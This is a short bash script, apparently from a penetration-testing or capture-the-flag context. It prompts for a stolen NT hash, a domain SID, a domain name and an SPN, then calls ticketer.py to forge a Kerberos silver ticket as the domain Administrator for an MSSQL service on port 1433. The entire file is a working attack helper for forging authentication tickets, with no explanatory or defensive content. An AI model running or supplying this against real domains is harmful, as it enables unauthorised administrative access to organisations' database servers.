#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"

echo -e "${BOLD}${RED}wow ! Forge Ticket to Admin (mssqlclient admin) ---<${RESET}"

 
echo "NTHASH:-"
read nthash

echo "Domain SID:-"
read sid

echo "Domain:-"
read domain

echo "spn (service principle name):-"
read spn

ticketer.py -nthash $nthash -domain-sid $sid -domain $domain -spn $spn:1433 -groups 1105 -user-id 500 Administrator
